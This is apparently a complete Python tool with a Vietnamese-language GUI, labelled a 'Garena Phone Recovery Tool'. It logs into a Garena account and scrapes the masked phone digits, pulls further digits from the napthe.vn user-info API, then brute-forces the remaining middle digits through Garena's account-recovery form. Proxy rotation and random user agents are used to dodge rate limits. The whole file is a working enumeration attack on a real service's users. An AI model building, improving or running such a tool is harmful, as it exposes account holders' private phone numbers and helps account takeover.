import asyncio
import json
import random
import re
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import List, Optional, Tuple
from urllib.parse import urlparse
import sys
import platform

import aiofiles
from playwright.async_api import TimeoutError as PlaywrightTimeoutError
from playwright.async_api import async_playwright

# Try to import tkinter for GUI
try:
    import tkinter as tk
    from tkinter import simpledialog, messagebox, scrolledtext
    HAS_TKINTER = True
except ImportError:
    HAS_TKINTER = False

LOGIN_URL = "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=vi-VN"
ACCOUNT_URL = "https://account.garena.com/"
NAPTHE_LOGIN_URL = "https://napthe.vn/"
NAPTHE_API_URL = "https://napthe.vn/api/auth/get_user_info/multi"
RECOVERY_URL = "https://account.garena.com/recovery#Ư/submit_phone"

SELECTORS = {
    "username": "input[name='username'], input[type='text']",
    "password": "input[name='password'], input[type='password']",
    "login_button": "button[type='submit'], button:has-text('Đăng nhập'), button:has-text('đăng nhập')",
    "captcha": "iframe[src*='captcha'], text=CAPTCHA, text=captcha, div[class*='captcha']",
    "otp": "text=OTP, text=mã xác minh, text=xác minh, input[placeholder*='OTP']",
    "masked_phone": "input[placeholder*='****']",
    "recovery_phone_input": "input[placeholder*='****'], input[placeholder*='điện thoại']",
    "recovery_submit": "button:has-text('Nhận mã'), button:has-text('tiếp tục'), button[type='submit']",
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
]


@dataclass
class Phase1Result:
    login_status: str
    last_4_digits: str = ""
    masked_phone: str = ""
    error: str = ""


@dataclass
class Phase2Result:
    api_status: str
    first_3_digits: str = ""
    full_masked_phone: str = ""
    error: str = ""


@dataclass
class Phase3Result:
    recovery_status: str
    complete_phone: str = ""
    attempts: int = 0
    error: str = ""


@dataclass
class AuditResult:
    username: str
    status: str
    timestamp: str = ""
    proxy_used: str = ""
    user_agent: str = ""
    phase1: Phase1Result = field(default_factory=lambda: Phase1Result("failed"))
    phase2: Phase2Result = field(default_factory=lambda: Phase2Result("failed"))
    phase3: Phase3Result = field(default_factory=lambda: Phase3Result("failed"))


class RotatingProxyRotator:
    def __init__(self, proxy_list: List[str]):
        self.proxies = [self._normalize_proxy(p) for p in proxy_list]
        self.current_index = 0
        self.dead_proxies = set()
        self.lock = asyncio.Lock()
        self.failed_count = {proxy: 0 for proxy in self.proxies}
        self.success_count = {proxy: 0 for proxy in self.proxies}
    
    def _normalize_proxy(self, proxy: str) -> str:
        if "://" not in proxy:
            return f"http://{proxy}"
        return proxy
    
    async def get_next_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        
        async with self.lock:
            healthy = [p for p in self.proxies if p not in self.dead_proxies]
            
            if not healthy:
                self.dead_proxies.clear()
                healthy = self.proxies
            
            if not healthy:
                return None
            
            proxy = healthy[self.current_index % len(healthy)]
            self.current_index += 1
            return proxy
    
    async def mark_success(self, proxy: str) -> None:
        async with self.lock:
            self.success_count[proxy] = self.success_count.get(proxy, 0) + 1
            self.failed_count[proxy] = 0
            self.dead_proxies.discard(proxy)
    
    async def mark_dead(self, proxy: str) -> None:
        async with self.lock:
            self.failed_count[proxy] = self.failed_count.get(proxy, 0) + 1
            if self.failed_count[proxy] >= 3:
                self.dead_proxies.add(proxy)


async def read_proxy_list(path: str) -> List[str]:
    proxies = []
    try:
        async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
            async for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    proxies.append(line)
    except FileNotFoundError:
        pass
    return proxies


async def is_visible(page, selector: str, timeout: int = 1500) -> bool:
    try:
        locator = page.locator(selector).first
        await locator.wait_for(timeout=timeout)
        return await locator.is_visible()
    except Exception:
        return False


def extract_last_4_digits(masked_phone: str) -> str:
    """
    Extract last 4 digits from masked phone format.
    Example: "+84 ****7287" -> "7287"
    """
    if not masked_phone:
        return ""
    
    # Tìm tất cả các số trong chuỗi
    digits = re.findall(r"\d", masked_phone)
    
    # Lấy 4 số cuối
    if len(digits) >= 4:
        return "".join(digits[-4:])
    
    return ""


def extract_first_3_digits(masked_phone_display: str) -> str:
    """
    Extract first 3 digits from masked phone format.
    Example: "+84 94*****87" -> "94" (nhưng cần 3 số nên là "940")
    Hoặc tìm "94" rồi cộng thêm 1 số nữa
    """
    if not masked_phone_display:
        return ""
    
    # Loại bỏ khoảng trắng
    phone_clean = masked_phone_display.replace(" ", "").strip()
    
    # Nếu có +84, convert thành 0
    if phone_clean.startswith("+84"):
        phone_clean = "0" + phone_clean[3:]
    
    # Tìm các số
    digits = re.findall(r"\d", phone_clean)
    
    # Lấy 3 số đầu
    if len(digits) >= 3:
        return "".join(digits[:3])
    
    return ""


def is_still_on_login_page(url: str) -> bool:
    parsed = urlparse(url)
    hostname = (parsed.hostname or "").lower()
    path = (parsed.path or "").lower()
    return hostname == "sso.garena.com" and "/login" in path


async def fetch_masked_phone_from_account(page) -> str:
    """
    Fetch masked phone từ trang account.garena.com
    Format: "+84 ****7287" hoặc "0****7287"
    """
    try:
        page_text = await page.evaluate("() => document.body.innerText")
        
        # Patterns để match masked phone
        patterns = [
            r'\+84\s+\*{2,}\d{2,4}',      # +84 ****7287
            r'0\s*\*{2,}\d{2,4}',          # 0****7287
            r'\+84\*{2,}\d{2,4}',          # +84****7287
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, page_text)
            if matches:
                result = matches[0].strip()
                print(f"[DEBUG] Found masked phone: {result}")
                return result
        
        # Backup: search in HTML
        page_html = await page.content()
        for pattern in patterns:
            matches = re.findall(pattern, page_html)
            if matches:
                result = matches[0].strip()
                print(f"[DEBUG] Found masked phone in HTML: {result}")
                return result
                
    except Exception as e:
        print(f"[DEBUG] Error fetching masked phone: {e}")
    
    return ""


async def phase1_garena_login(
    username: str,
    password: str,
    timeout: int,
    proxy: Optional[str],
    log_callback=None,
) -> Phase1Result:
    result = Phase1Result(login_status="failed")
    
    args = []
    if platform.system() != "Windows":
        args = ["--no-sandbox"]
    
    launch_kwargs = {"headless": True, "args": args}
    if proxy:
        launch_kwargs["proxy"] = {"server": proxy}
    
    browser = None
    context = None
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(**launch_kwargs)
            context = await browser.new_context(
                locale="vi-VN",
                viewport={"width": 1280, "height": 800},
                user_agent=random.choice(USER_AGENTS),
            )
            page = await context.new_page()
            
            if log_callback:
                log_callback("[Phase 1] 🔐 Đăng nhập Garena...")
            
            # Goto login page
            await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)
            await asyncio.sleep(1)
            
            # Check CAPTCHA before login
            if await is_visible(page, SELECTORS["captcha"], timeout=1000):
                result.login_status = "manual_required"
                result.error = "CAPTCHA before login"
                if log_callback:
                    log_callback("[!] ⚠️ CAPTCHA detected trước đăng nhập. Waiting...")
                await asyncio.sleep(10)
            
            # Fill credentials
            if log_callback:
                log_callback(f"[Phase 1] Điền tài khoản: {username}")
            
            await page.fill(SELECTORS["username"], username)
            await page.fill(SELECTORS["password"], password)
            
            if log_callback:
                log_callback("[Phase 1] Nhấn nút đăng nhập...")
            
            await page.click(SELECTORS["login_button"])
            
            # Wait for navigation
            await asyncio.sleep(2)
            try:
                await page.wait_for_load_state("networkidle", timeout=5000)
            except PlaywrightTimeoutError:
                pass
            
            # Check OTP
            if await is_visible(page, SELECTORS["otp"], timeout=1000):
                result.login_status = "manual_required"
                result.error = "OTP required"
                if log_callback:
                    log_callback("[!] ⚠️ OTP required. Waiting...")
                await asyncio.sleep(10)
            
            # Check CAPTCHA after login
            if await is_visible(page, SELECTORS["captcha"], timeout=1000):
                result.login_status = "manual_required"
                result.error = "CAPTCHA after login"
                if log_callback:
                    log_callback("[!] ⚠️ CAPTCHA detected sau đăng nhập. Waiting...")
                await asyncio.sleep(10)
            
            # Check if still on login page
            if is_still_on_login_page(page.url):
                result.login_status = "failed"
                result.error = "Still on login page - credentials invalid"
                if log_callback:
                    log_callback(f"[!] ❌ Đăng nhập thất bại: URL còn ở login page")
                return result
            
            if log_callback:
                log_callback(f"[Phase 1] URL hiện tại: {page.url}")
            
            # Navigate to account page
            if log_callback:
                log_callback("[Phase 1] Điều hướng tới trang tài khoản...")
            
            await page.goto(ACCOUNT_URL, wait_until="domcontentloaded", timeout=timeout)
            await asyncio.sleep(2)
            
            # Verify we're on account page
            if "account.garena.com" not in page.url.lower():
                result.login_status = "failed"
                result.error = f"Failed to navigate to account page. URL: {page.url}"
                if log_callback:
                    log_callback(f"[!] ❌ Không thể vào trang account: {page.url}")
                return result
            
            # Fetch masked phone
            if log_callback:
                log_callback("[Phase 1] 🔍 Tìm số điện thoại che dấu...")
            
            masked_phone = await fetch_masked_phone_from_account(page)
            result.masked_phone = masked_phone
            result.last_4_digits = extract_last_4_digits(masked_phone)
            
            if result.last_4_digits:
                result.login_status = "success"
                if log_callback:
                    log_callback(f"✅ Số điện thoại: {masked_phone}")
                    log_callback(f"✅ 4 số cuối: {result.last_4_digits}")
            else:
                result.login_status = "failed"
                result.error = "Could not extract last 4 digits from phone"
                if log_callback:
                    log_callback(f"❌ Không thể trích xuất 4 số cuối từ: {masked_phone}")
            
            return result
    
    except Exception as e:
        result.error = f"{type(e).__name__}: {str(e)[:150]}"
        if log_callback:
            log_callback(f"❌ Phase 1 Error: {result.error}")
        return result
    finally:
        if browser:
            try:
                await browser.close()
            except Exception:
                pass
        if context:
            try:
                await context.close()
            except Exception:
                pass


async def phase2_napthe_api(
    username: str,
    password: str,
    garena_username: str,
    timeout: int,
    proxy: Optional[str],
    log_callback=None,
) -> Phase2Result:
    result = Phase2Result(api_status="failed")
    
    args = []
    if platform.system() != "Windows":
        args = ["--no-sandbox"]
    
    launch_kwargs = {"headless": True, "args": args}
    if proxy:
        launch_kwargs["proxy"] = {"server": proxy}
    
    browser = None
    context = None
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(**launch_kwargs)
            context = await browser.new_context(
                locale="vi-VN",
                viewport={"width": 1280, "height": 800},
                user_agent=random.choice(USER_AGENTS),
            )
            page = await context.new_page()
            
            if log_callback:
                log_callback("\n[Phase 2] 🌐 Đăng nhập napthe.vn...")
            
            await page.goto(NAPTHE_LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)
            await asyncio.sleep(1)
            
            try:
                if log_callback:
                    log_callback(f"[Phase 2] Điền tài khoản: {username}")
                
                await page.fill("input[name='username'], input[type='email']", username)
                await page.fill("input[name='password'], input[type='password']", password)
                
                if log_callback:
                    log_callback("[Phase 2] Nhấn nút đăng nhập...")
                
                await page.click("button[type='submit'], button:has-text('Đăng nhập')")
                
                await asyncio.sleep(2)
                try:
                    await page.wait_for_load_state("networkidle", timeout=5000)
                except PlaywrightTimeoutError:
                    pass
            except Exception as e:
                result.error = f"napthe login failed: {str(e)[:100]}"
                if log_callback:
                    log_callback(f"❌ Lỗi đăng nhập napthe: {result.error}")
                return result
            
            if log_callback:
                log_callback(f"[Phase 2] 📞 Gọi API napthe để lấy info người dùng: {garena_username}")
            
            try:
                api_response = await page.evaluate(f"""
                    (async () => {{
                        try {{
                            const response = await fetch('{NAPTHE_API_URL}', {{
                                method: 'POST',
                                headers: {{'Content-Type': 'application/json'}},
                                body: JSON.stringify({{username: '{garena_username}'}})
                            }});
                            const data = await response.json();
                            console.log('API Response:', JSON.stringify(data));
                            return data;
                        }} catch (e) {{
                            return {{'error': e.message}};
                        }}
                    }})()
                """)
                
                if log_callback:
                    log_callback(f"[Phase 2] 📦 API Response: {json.dumps(api_response, ensure_ascii=False)[:200]}")
                
                if api_response and isinstance(api_response, dict):
                    phone = None
                    
                    # Try to find phone in multiple locations
                    if "display_mobile_no" in api_response:
                        phone = api_response.get("display_mobile_no")
                    elif "mobile" in api_response:
                        phone = api_response.get("mobile")
                    elif "phone" in api_response:
                        phone = api_response.get("phone")
                    elif "data" in api_response and isinstance(api_response["data"], dict):
                        data = api_response["data"]
                        phone = data.get("display_mobile_no") or data.get("mobile") or data.get("phone")
                    
                    if phone:
                        result.full_masked_phone = str(phone)
                        result.first_3_digits = extract_first_3_digits(str(phone))
                        
                        if result.first_3_digits:
                            result.api_status = "success"
                            if log_callback:
                                log_callback(f"✅ Số điện thoại từ API: {result.full_masked_phone}")
                                log_callback(f"✅ 3 số đầu: {result.first_3_digits}")
                            return result
                        else:
                            result.error = f"Could not extract first 3 digits from: {phone}"
                            if log_callback:
                                log_callback(f"❌ {result.error}")
                    else:
                        result.error = "No phone field found in API response"
                        if log_callback:
                            log_callback(f"❌ {result.error}")
                else:
                    result.error = f"Invalid API response: {api_response}"
                    if log_callback:
                        log_callback(f"❌ {result.error}")
                
                return result
            
            except Exception as e:
                result.error = f"API call error: {str(e)[:100]}"
                if log_callback:
                    log_callback(f"❌ Lỗi gọi API: {result.error}")
                return result
    
    except Exception as e:
        result.error = f"{type(e).__name__}: {str(e)[:150]}"
        if log_callback:
            log_callback(f"❌ Phase 2 Error: {result.error}")
        return result
    finally:
        if browser:
            try:
                await browser.close()
            except Exception:
                pass
        if context:
            try:
                await context.close()
            except Exception:
                pass


async def phase3_recovery_brute_force(
    username: str,
    first_3_digits: str,
    last_4_digits: str,
    phase3_delay: float,
    timeout: int,
    proxy: Optional[str],
    log_callback=None,
) -> Phase3Result:
    result = Phase3Result(recovery_status="failed")
    
    if not first_3_digits or not last_4_digits:
        result.error = "Missing first 3 or last 4 digits"
        if log_callback:
            log_callback(f"❌ Thiếu 3 số đầu hoặc 4 số cuối")
        return result
    
    args = []
    if platform.system() != "Windows":
        args = ["--no-sandbox"]
    
    launch_kwargs = {"headless": True, "args": args}
    if proxy:
        launch_kwargs["proxy"] = {"server": proxy}
    
    browser = None
    context = None
    
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(**launch_kwargs)
            context = await browser.new_context(
                locale="vi-VN",
                viewport={"width": 1280, "height": 800},
                user_agent=random.choice(USER_AGENTS),
            )
            page = await context.new_page()
            
            if log_callback:
                log_callback("\n[Phase 3] 🔄 Brute-force recovery...")
                log_callback(f"[Phase 3] Pattern: {first_3_digits}XXX{last_4_digits}")
                log_callback(f"[Phase 3] Range: 0-999 (Tổng cộng 1000 attempts)")
            
            await page.goto(RECOVERY_URL, wait_until="domcontentloaded", timeout=timeout)
            await asyncio.sleep(2)
            
            # Fill username
            try:
                username_input = page.locator("input[type='text'], input[placeholder*='username'], input[placeholder*='Username']").first
                await username_input.fill(username)
                if log_callback:
                    log_callback(f"[Phase 3] ✓ Filled username: {username}")
            except Exception as e:
                if log_callback:
                    log_callback(f"[Phase 3] ⚠️ Could not fill username: {e}")
            
            await asyncio.sleep(1)
            
            for middle_attempt in range(0, 1000):
                result.attempts = middle_attempt + 1
                
                middle = str(middle_attempt).zfill(3)
                test_phone = f"{first_3_digits}{middle}{last_4_digits}"
                
                try:
                    # Find and fill phone input
                    phone_input = page.locator(SELECTORS["recovery_phone_input"]).first
                    await phone_input.fill("")
                    await phone_input.fill(test_phone)
                    
                    # Click submit button
                    verify_button = page.locator(SELECTORS["recovery_submit"]).first
                    await verify_button.click()
                    
                    # Wait before checking
                    await asyncio.sleep(phase3_delay)
                    
                    current_url = page.url
                    page_content = await page.content()
                    
                    # Success indicators (Vietnamese text thường hiện khi số đúng)
                    success_indicators = [
                        "nhận mã",
                        "gửi mã",
                        "xác minh",
                        "verify",
                        "otp",
                        "mã xác minh",
                        "code",
                        "tiếp tục",
                        "next"
                    ]
                    
                    is_success = any(
                        ind.lower() in page_content.lower()
                        for ind in success_indicators
                    )
                    
                    # Check URL change
                    url_changed = ("submit_phone" not in current_url or "verify" in current_url.lower())
                    
                    # Check for error messages
                    error_indicators = [
                        "sai",
                        "không đúng",
                        "invalid",
                        "error",
                        "lỗi",
                        "thất bại",
                        "failed"
                    ]
                    
                    has_error = any(
                        ind.lower() in page_content.lower()
                        for ind in error_indicators
                    )
                    
                    if is_success or url_changed:
                        result.complete_phone = test_phone
                        result.recovery_status = "success"
                        if log_callback:
                            log_callback(f"\n✅ ✅ ✅ TÌM THẤY SỐ: {test_phone}")
                            log_callback(f"✅ Attempt #{result.attempts}/1000")
                        return result
                    
                    if "429" in page_content or "too many" in page_content.lower():
                        result.error = "Rate limited (429) - too many requests"
                        if log_callback:
                            log_callback(f"❌ Rate limited at attempt {result.attempts}")
                        return result
                    
                    if "locked" in page_content.lower() or "khóa" in page_content.lower():
                        result.error = "Account locked"
                        if log_callback:
                            log_callback(f"❌ Account locked at attempt {result.attempts}")
                        return result
                    
                    # Progress logging
                    if (middle_attempt + 1) % 100 == 0:
                        if log_callback:
                            log_callback(f"[Phase 3] Progress: {result.attempts}/1000 - Testing {first_3_digits}{middle}{last_4_digits}")
                
                except Exception as e:
                    if (middle_attempt + 1) % 200 == 0:
                        if log_callback:
                            log_callback(f"[Phase 3] ⚠️ Error: {str(e)[:50]}")
                    await asyncio.sleep(phase3_delay)
                    continue
            
            result.error = "No valid phone found after 1000 attempts"
            if log_callback:
                log_callback(f"\n❌ Không tìm thấy số điện thoại đúng sau 1000 lần thử")
            return result
    
    except Exception as e:
        result.error = f"{type(e).__name__}: {str(e)[:150]}"
        if log_callback:
            log_callback(f"❌ Phase 3 Error: {result.error}")
        return result
    finally:
        if browser:
            try:
                await browser.close()
            except Exception:
                pass
        if context:
            try:
                await context.close()
            except Exception:
                pass


async def process_account(
    username: str,
    password: str,
    proxy: Optional[str],
    log_callback=None,
) -> AuditResult:
    result = AuditResult(
        username=username,
        status="failed",
        timestamp=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        user_agent=random.choice(USER_AGENTS),
    )
    
    result.proxy_used = proxy or "none"
    
    if log_callback:
        log_callback(f"\n{'='*60}")
        log_callback(f"🔐 Processing Account: {username}")
        log_callback(f"{'='*60}")
        if proxy:
            log_callback(f"Proxy: {proxy}")
    
    # Phase 1: Garena Login
    result.phase1 = await phase1_garena_login(username, password, 45000, proxy, log_callback)
    
    if result.phase1.login_status != "success":
        result.status = result.phase1.login_status
        if log_callback:
            log_callback(f"\n❌ Phase 1 Failed: {result.phase1.error}")
        return result
    
    await asyncio.sleep(3)
    
    # Phase 2: napthe API
    result.phase2 = await phase2_napthe_api(
        username, password, username, 45000, proxy, log_callback
    )
    
    if result.phase2.api_status != "success":
        result.status = "failed"
        if log_callback:
            log_callback(f"\n❌ Phase 2 Failed: {result.phase2.error}")
        return result
    
    await asyncio.sleep(3)
    
    # Phase 3: Recovery Brute Force
    result.phase3 = await phase3_recovery_brute_force(
        username,
        result.phase2.first_3_digits,
        result.phase1.last_4_digits,
        2.0,  # Reduced delay
        45000,
        proxy,
        log_callback,
    )
    
    if result.phase3.recovery_status == "success":
        result.status = "success"
    else:
        result.status = "failed"
        if log_callback:
            log_callback(f"\n❌ Phase 3 Failed: {result.phase3.error}")
    
    return result


class GarenaRecoveryGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Garena Phone Recovery Tool v3 - FIXED")
        self.root.geometry("1000x750")
        
        self.proxy_rotator = None
        self.is_running = False
        
        # Main frame
        main_frame = tk.Frame(root, padx=20, pady=20, bg="#f0f0f0")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Title
        title_label = tk.Label(
            main_frame,
            text="🔐 Garena Phone Recovery Tool v3 - FIXED",
            font=("Arial", 16, "bold"),
            fg="#d4af37",
            bg="#f0f0f0"
        )
        title_label.pack(pady=10)
        
        # Account credentials
        account_frame = tk.LabelFrame(main_frame, text="Account Credentials", padx=10, pady=10, font=("Arial", 10, "bold"), bg="#f0f0f0")
        account_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(account_frame, text="Username:", font=("Arial", 10), bg="#f0f0f0").pack(anchor=tk.W)
        self.username = tk.Entry(account_frame, width=50, font=("Arial", 10))
        self.username.pack(fill=tk.X, pady=5)
        
        tk.Label(account_frame, text="Password:", font=("Arial", 10), bg="#f0f0f0").pack(anchor=tk.W)
        self.password = tk.Entry(account_frame, width=50, font=("Arial", 10), show="*")
        self.password.pack(fill=tk.X, pady=5)
        
        tk.Label(account_frame, text="💡 Sử dụng tài khoản giống nhau cho Garena & napthe.vn", font=("Arial", 8, "italic"), fg="#666", bg="#f0f0f0").pack(anchor=tk.W, pady=3)
        
        # Proxy option
        proxy_frame = tk.LabelFrame(main_frame, text="Proxy (Optional)", padx=10, pady=10, font=("Arial", 10, "bold"), bg="#f0f0f0")
        proxy_frame.pack(fill=tk.X, pady=10)
        
        self.use_proxy = tk.BooleanVar(value=False)
        tk.Checkbutton(proxy_frame, text="Sử dụng Proxy từ proxy.txt", variable=self.use_proxy, font=("Arial", 10), bg="#f0f0f0").pack(anchor=tk.W)
        
        # Buttons
        button_frame = tk.Frame(main_frame, bg="#f0f0f0")
        button_frame.pack(fill=tk.X, pady=15)
        
        self.start_btn = tk.Button(
            button_frame,
            text="▶ Bắt đầu",
            font=("Arial", 12, "bold"),
            bg="#4CAF50",
            fg="white",
            padx=20,
            pady=10,
            command=self.start_recovery
        )
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.clear_btn = tk.Button(
            button_frame,
            text="🔄 Xóa",
            font=("Arial", 12, "bold"),
            bg="#2196F3",
            fg="white",
            padx=20,
            pady=10,
            command=self.clear_fields
        )
        self.clear_btn.pack(side=tk.LEFT, padx=5)
        
        # Output log
        log_frame = tk.LabelFrame(main_frame, text="📋 Output Log", padx=10, pady=10, font=("Arial", 10, "bold"), bg="#f0f0f0")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=14, width=100, font=("Courier", 9), bg="#1e1e1e", fg="#00ff00")
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Status
        self.status_label = tk.Label(main_frame, text="Ready", font=("Arial", 10), fg="#4CAF50", bg="#f0f0f0")
        self.status_label.pack(pady=5)
    
    def log(self, message):
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)
        self.root.update()
    
    def clear_fields(self):
        self.username.delete(0, tk.END)
        self.password.delete(0, tk.END)
        self.log_text.delete(1.0, tk.END)
        self.status_label.config(text="Ready", fg="#4CAF50")
    
    def start_recovery(self):
        username = self.username.get().strip()
        password = self.password.get().strip()
        
        if not username or not password:
            messagebox.showerror("Error", "Vui lòng nhập tên đăng nhập và mật khẩu")
            return
        
        if self.is_running:
            messagebox.showwarning("Warning", "Tool đang chạy!")
            return
        
        # Disable buttons during processing
        self.start_btn.config(state=tk.DISABLED)
        self.clear_btn.config(state=tk.DISABLED)
        
        # Clear log
        self.log_text.delete(1.0, tk.END)
        
        # Run async task
        self.is_running = True
        asyncio.create_task(self.run_recovery(username, password))
    
    async def run_recovery(self, username, password):
        try:
            self.status_label.config(text="Running...", fg="#FF9800")
            
            proxy = None
            if self.use_proxy.get():
                proxies = await read_proxy_list("proxy.txt")
                if proxies:
                    self.proxy_rotator = RotatingProxyRotator(proxies)
                    self.log(f"[PROXY] ✓ Loaded {len(proxies)} proxies")
                    proxy = await self.proxy_rotator.get_next_proxy()
                    self.log(f"[PROXY] Using: {proxy}")
                else:
                    self.log("[WARN] proxy.txt not found, running without proxy")
            
            result = await process_account(
                username,
                password,
                proxy,
                self.log
            )
            
            # Display result
            self.log("\n" + "="*60)
            self.log(f"🎯 RESULT: {result.status.upper()}")
            self.log("="*60)
            self.log(f"Username: {result.username}")
            self.log(f"Status: {result.status}")
            self.log(f"Timestamp: {result.timestamp}")
            self.log(f"\n📱 Phone Information:")
            self.log(f"  - Last 4 digits (Phase 1): {result.phase1.last_4_digits}")
            self.log(f"  - First 3 digits (Phase 2): {result.phase2.first_3_digits}")
            self.log(f"  - Complete phone (Phase 3): {result.phase3.complete_phone}")
            self.log(f"  - Attempts: {result.phase3.attempts}/1000")
            
            if result.status == "success":
                self.status_label.config(text="✓ Success!", fg="#4CAF50")
                messagebox.showinfo("✅ Success", f"🎉 Phone number found:\n\n{result.phase3.complete_phone}")
                
                # Save result to JSON
                output_data = {
                    "username": result.username,
                    "status": result.status,
                    "phone": result.phase3.complete_phone,
                    "timestamp": result.timestamp,
                    "attempts": result.phase3.attempts,
                    "proxy": result.proxy_used,
                }
                
                output_path = Path(f"garena_result_{result.username}.json")
                with open(output_path, "w", encoding="utf-8") as f:
                    json.dump(output_data, f, ensure_ascii=False, indent=2)
                
                self.log(f"\n✓ Result saved to: {output_path}")
            else:
                self.status_label.config(text="✗ Failed", fg="#f44336")
                error_msg = result.phase1.error or result.phase2.error or result.phase3.error or "Unknown error"
                messagebox.showerror("❌ Failed", f"Recovery failed:\n\n{error_msg}")
        
        except Exception as e:
            self.log(f"\n[ERROR] {str(e)}")
            self.status_label.config(text="✗ Error", fg="#f44336")
            messagebox.showerror("Error", f"An error occurred:\n{str(e)}")
        
        finally:
            # Enable buttons
            self.start_btn.config(state=tk.NORMAL)
            self.clear_btn.config(state=tk.NORMAL)
            self.is_running = False


async def main_gui():
    if not HAS_TKINTER:
        print("ERROR: tkinter not found. Install it with:")
        print("Windows: python -m pip install tk")
        print("Linux: sudo apt-get install python3-tk")
        return
    
    root = tk.Tk()
    app = GarenaRecoveryGUI(root)
    
    # Run event loop
    async def update_gui():
        try:
            while True:
                root.update()
                await asyncio.sleep(0.01)
        except tk.TclError:
            pass
    
    await update_gui()


if __name__ == "__main__":
    try:
        asyncio.run(main_gui())
    except KeyboardInterrupt:
        print("\nExiting...")
